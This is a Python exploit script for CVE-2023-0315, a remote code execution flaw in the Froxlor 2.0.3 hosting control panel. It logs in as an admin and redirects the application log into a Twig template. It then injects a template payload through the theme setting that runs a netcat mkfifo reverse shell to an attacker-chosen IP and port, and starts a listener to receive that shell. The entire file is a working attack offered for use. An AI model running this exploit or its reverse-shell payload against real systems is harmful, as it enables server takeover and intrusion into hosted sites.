#!/usr/bin/python3

# Exploit Title: Froxlor 2.0.3 Stable - Remote Code Execution
# Date: 2023-01-08
# Exploit Author: Askar (@mohammadaskar2)
# CVE: CVE-2023-0315
# Vendor Homepage: https://froxlor.org/
# Version: v2.0.3
# Tested on: Ubuntu 20.04 / PHP 8.2

import telnetlib
import requests
import socket
import sys
import warnings
import random
import string
from bs4 import BeautifulSoup
from urllib.parse import quote
from threading import Thread

warnings.filterwarnings("ignore", category=UserWarning, module='bs4')


if len(sys.argv) != 6:
    print("[~] Usage : ./froxlor-rce.py url username password ip port")
    exit()

url = sys.argv[1]
username = sys.argv[2]
password = sys.argv[3]
ip = sys.argv[4]
port = sys.argv[5]

request = requests.session()

def login():
    login_info = {
    "loginname": username,
    "password": password,
    "send": "send",
    "dologin": ""
    }
    login_request = request.post(url+"/index.php", login_info, allow_redirects=False)
    login_headers = login_request.headers
    location_header = login_headers["Location"]
    if location_header == "admin_index.php":
        return True
    else:
        return False


def change_log_path():
    change_log_path_url = url + "/admin_settings.php?page=overview&part=logging"
    csrf_token_req = request.get(change_log_path_url)
    csrf_token_req_response = csrf_token_req.text
    soup = BeautifulSoup(csrf_token_req_response, "lxml")
    csrf_token = (soup.find("meta",  {"name":"csrf-token"})["content"])
    print("[+] Main CSRF token retrieved %s" % csrf_token)

    multipart_data = {

        "logger_enabled": (None, "0"),
        "logger_enabled": (None, "1"),
        "logger_severity": (None, "2"),
        "logger_logtypes[]": (None, "file"),
        "logger_logfile": (None, "/var/www/html/froxlor/templates/Froxlor/footer.html.twig"),
        "logger_log_cron": (None, "0"),
        "csrf_token": (None, csrf_token),
        "page": (None, "overview"),
        "action": (None, ""),
        "send": (None, "send")
    
    }
    req = request.post(change_log_path_url, files=multipart_data)
    response = req.text
    if "The settings have been successfully saved." in response:
        print("[+] Changed log file path!")
        return True
    else:
        return False


def inject_template():
    admin_page_path = url + "/admin_index.php"
    csrf_token_req = request.get(admin_page_path)
    csrf_token_req_response = csrf_token_req.text
    soup = BeautifulSoup(csrf_token_req_response, "lxml")
    csrf_token = (soup.find("meta",  {"name":"csrf-token"})["content"])
    onliner = "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {0} {1} >/tmp/f".format(ip, port)
    payload = "{{['%s']|filter('exec')}}" % onliner
    data = {
        "theme": payload,
        "csrf_token": csrf_token,
        "page": "change_theme",
        "send": "send",
        "dosave": "",
    }
    req = request.post(admin_page_path, data, allow_redirects=False)
    try:
        location_header = req.headers["Location"]
        if location_header == "admin_index.php":
            print("[+] Injected the payload sucessfully!")
    except:
        print("[-] Can't Inject payload :/")
        exit()
    handler_thread = Thread(target=connection_handler, args=(port,))
    handler_thread.start()
    print("[+] Triggering the payload ...")
    req2 = request.get(admin_page_path)


def connection_handler(port):
    print("[+] Listener started on port %s" % port)
    t = telnetlib.Telnet()
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(("0.0.0.0", int(port)))
    s.listen(1)
    conn, addr = s.accept()
    print("[+] Connection received from %s" % addr[0])
    t.sock = conn
    print("[+] Heads up, incoming shell!!")
    t.interact()



if login():
    print("[+] Successfully Logged in!")
    index_url = url + "/admin_index.php"
    request.get(index_url)
    if change_log_path():
        inject_template()

else:
    print("[-] Can't login")